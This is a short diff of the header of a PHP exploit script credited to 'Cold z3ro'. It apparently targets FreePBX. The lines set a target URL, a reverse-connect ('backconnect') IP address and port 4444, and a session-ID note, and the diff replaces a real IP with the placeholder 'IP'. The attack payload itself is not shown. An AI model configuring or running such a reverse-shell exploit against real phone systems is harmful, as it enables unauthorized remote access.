@@ -5,7 +5,7 @@
 /// Cod[3]d by Cold z3ro 
 ///
 $url = "remotefreepbx.com";
-$backconnectip = "144.217.52.246";
+$backconnectip = "IP";
 $port = "4444"; 
 $PHPSESSID = "any valid seesion even extension";
 
